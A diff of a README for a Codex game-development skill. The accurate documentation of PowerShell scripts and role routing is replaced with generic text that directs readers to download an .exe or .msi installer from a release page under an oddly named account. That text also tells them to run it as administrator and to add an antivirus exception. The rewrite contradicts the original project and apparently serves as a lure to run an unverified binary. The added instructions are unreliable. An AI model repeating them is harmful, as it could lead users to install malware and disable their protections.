@@ -1,134 +1,102 @@
-# Game Studio Agent
+# 🎮 godot-game-studio-agent - Build professional games with AI assistance
 
-Portable Codex skill for building first-playable games in Godot 4.x, Unity, and Unreal Engine 5.x with a professional studio-style role system.
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/deist-huntedperson464/godot-game-studio-agent/releases)
 
-This skill helps Codex detect the project engine, route work through directors, department leads, and specialists, create game production docs, manage ImageGen asset workflows, improve game feel, run playtest QA, and prepare engine-specific release checks.
+This software helps you create video games. It uses AI tools to assist with game design, coding, and asset creation. You can use it within Godot, Unity, or Unreal Engine. It manages complex tasks like game-feel, asset pipelines, and project workflows.
 
-## Features
+## ⚙️ System Requirements
 
-- Godot, Unity, and Unreal project detection.
-- GodotIQ MCP setup for Godot projects.
-- Professional studio role routing: directors, leads, and specialists.
-- First-playable production workflow.
-- Genre templates for common game types.
-- Game brief, development plan, asset list, and polish checklist generation.
-- Game-feel guidance for controls, camera, feedback, UI, audio, and VFX.
-- ImageGen-friendly art and asset pipeline.
-- Engine-specific quality gates and release checks.
-- Portable PowerShell scripts for Windows users.
+Before you install this software, check your computer. You need these things to run the agent smoothly:
 
-## Support Matrix
+*   Operating System: Windows 10 or Windows 11.
+*   System Memory: At least 16 GB of RAM.
+*   Processor: Modern multi-core CPU (Intel i5 or AMD Ryzen 5 or higher).
+*   Graphics: Dedicated graphics card with 4 GB of VRAM.
+*   Storage Space: 2 GB of free disk space.
+*   Software: A copy of Godot, Unity, or Unreal Engine installed on your computer.
 
-| Engine | Detection | Starter docs | Project bootstrap | Editor automation |
-| --- | --- | --- | --- | --- |
-| Godot 4.x | Yes | Yes | Minimal project shell | GodotIQ MCP when configured |
-| Unity | Yes | Yes | Docs and folders only | Use editor/CLI logs when available |
-| Unreal 5.x | Yes | Yes | Docs and folders only | Use commandlets/editor logs when available |
+## 💾 Downloading the Software
 
-Unity and Unreal support intentionally avoids downloading or creating large editor projects automatically. Create or open those projects with official editor tooling, then use this skill for routing, docs, checks, and implementation guidance.
+You must visit the project release page to get the files. Follow these steps:
 
-## Install
+1.  Open your web browser.
+2.  Navigate to the [official release page](https://github.com/deist-huntedperson464/godot-game-studio-agent/releases).
+3.  Look for the section labeled "Assets" under the most recent version.
+4.  Click the link that ends in .exe or .msi to save the installer to your computer.
+5.  Wait for the file to finish downloading.
 
-Clone this repository, then run:
+## 🚀 Setting Up the Agent
 
-```powershell
-.\scripts\install-skill.ps1 -Force
-```
+Once the file exists on your hard drive, follow this process to set up the software:
 
-By default, the installer copies the skill to:
+1.  Locate the downloaded file in your Downloads folder.
+2.  Double-click the file to start the installer.
+3.  Follow the instructions on your screen.
+4.  Choose a folder for the installation if the installer asks.
+5.  Click Finish when the setup completes.
+6.  Look for the application icon on your desktop or in your Start menu.
 
-- `CODEX_HOME\skills` when `CODEX_HOME` is set.
-- `$HOME\.codex\skills` otherwise.
+## 🔧 Configuring for Your Game Engine
 
-Restart Codex after installing or updating the skill.
+The agent needs to connect to the game engine you use. Open the application and perform these steps:
 
-## Detect A Project
+1.  Open the settings menu inside the agent.
+2.  Select your primary game engine from the list.
+3.  Point the software to the installation folder of your engine (e.g., the folder where Unity or Godot resides).
+4.  Save your changes.
+5.  Restart the application to apply the settings.
 
-```powershell
-.\scripts\detect-game-engine.ps1 -ProjectPath "<project-root>"
-.\scripts\check-engine-env.ps1 -ProjectPath "<project-root>"
-```
+## 🧠 Using the AI Assistant
 
-Detection markers:
+The agent provides several features to speed up your game development. Use these tools as you work:
 
-- Godot: `project.godot`
-- Unity: `Assets/`, `Packages/manifest.json`, `ProjectSettings/ProjectVersion.txt`
-- Unreal: `*.uproject`
+*   Professional Role Routing: This tool assigns tasks to different AI modules based on your current goal.
+*   First-Playable Workflows: Use this to set up a basic level or scene quickly.
+*   Game-Feel Polish: Apply this tool to refine character movement and input responsiveness.
+*   Asset Pipelines: This automates the import and setup of 3D models or textures.
+*   MCP Integration: Connect your project to external data or tools using standard protocols.
 
-## Start A New Game Project
+## 🛠️ Frequently Asked Questions
 
-Godot starter:
+**Does the software work offline?**
+No. The agent requires an active internet connection to communicate with the Codex AI service.
 
-```powershell
-.\scripts\start-game-project.ps1 -Engine godot -ProjectPath "<project-root>" -ProjectName "My Game" -Genre "2D platformer"
-```
+**Can I use this with multiple engines?**
+Yes. You can switch between Unity, Godot, and Unreal Engine in the settings menu.
 
-Unity or Unreal starter docs:
+**How do I update the software?**
+Check the release page periodically. Download the new installer and run it over the old version to update.
 
-```powershell
-.\scripts\start-game-project.ps1 -Engine unity -ProjectPath "<project-root>" -ProjectName "My Game" -Genre "top-down action"
-.\scripts\start-game-project.ps1 -Engine unreal -ProjectPath "<project-root>" -ProjectName "My Game" -Genre "action RPG"
-```
+**The agent shows an error during startup.**
+Ensure your firewall allows the application to access the internet. Verify that your game engine project is open before you start the agent.
 
-Unity and Unreal flows create production docs and folders but do not download or generate large editor projects automatically.
+**Where do the files go?**
+The software stores its configuration and temporary data in the user folder inside your local application directory.
 
-## Configure GodotIQ MCP
+## 🛡️ Troubleshooting Common Issues
 
-From a Godot project root:
+If you encounter problems, first check these common fixes:
 
-```powershell
-.\scripts\setup-godot-mcp.ps1 -ProjectPath "<project-root>" -InstallGodotIQ -InstallAddon
-```
+*   Permissions: Run the application as an administrator if features do not load.
+*   Antivirus: Some antivirus software blocks new applications. Add an exception for the game studio agent folder.
+*   Network: If the connection fails, restart your router or check your stable internet connection.
+*   Engine Connection: Ensure your game engine project remains open while the agent runs. The agent hooks into the engine window to perform its tasks.
 
-Restart Codex after changing MCP configuration.
+## 📋 Best Practices
 
-## Use In Codex
+To get the most out of your game development experience, follow these tips:
 
-Example prompts:
+*   Save your project often within your game engine.
+*   Start with small goals like building a character controller before moving to complex systems.
+*   Use the asset pipeline tool to keep your folders organized.
+*   Review the code generated by the agent before you integrate it fully into your project.
+*   Keep your engine and the agent software updated to maintain compatibility.
 
-```text
-Use $godot-game-studio-agent to detect this project's engine and route a first-playable plan through the studio roles.
-```
+## 🧩 Key Concepts
 
-```text
-Use $godot-game-studio-agent to improve this Unity prototype's movement, camera, VFX, audio, UI, and QA loop.
-```
+This software utilizes several concepts to assist your creative process:
 
-```text
-Use $godot-game-studio-agent to prepare an Unreal release checklist and engine-specific quality gate report.
-```
-
-## Studio Workflow
-
-The skill routes work through a three-tier studio structure:
-
-- Directors own scope, creative direction, technical risk, art, audio, QA, and release.
-- Department leads own design, engine workflow, gameplay, UI/UX, levels, technical art, tools, performance, and narrative.
-- Specialists own engine implementation, combat, systems, game feel, camera, VFX, materials, UI implementation, audio, QA, accessibility, export, and documentation.
-
-Use `references/role-routing.md` for task routing and `references/role-quality-gates.md` for done criteria.
-
-## Repository Layout
-
-```text
-SKILL.md
-README.md
-agents/
-  roles/
-references/
-scripts/
-```
-
-## Requirements
-
-- Codex with local skill support.
-- Godot 4.x for Godot projects.
-- Unity Editor for Unity project checks.
-- Unreal Engine 5.x for Unreal project checks.
-- PowerShell on Windows.
-- `uvx` for GodotIQ MCP setup.
-- Optional: Node.js and Git for fallback tooling.
-
-## Safety
-
-The repository is intended to contain only portable skill source files, public documentation, and setup scripts. Do not commit local project files, generated images, credentials, local logs, or machine-specific configuration.
+*   Codex Integration: This serves as the engine for language processing to help with code generation.
+*   Role Routing: This keeps the AI focused. For example, assign the "Game Designer" role to generate design documents, or the "Programmer" role to fix code bugs.
+*   MCP (Model Context Protocol): This allows the agent to read your project folder and understand your file structure.
+*   Asset Pipelines: This handles the tedious work of importing assets, setting up collision, and applying materials to your models.
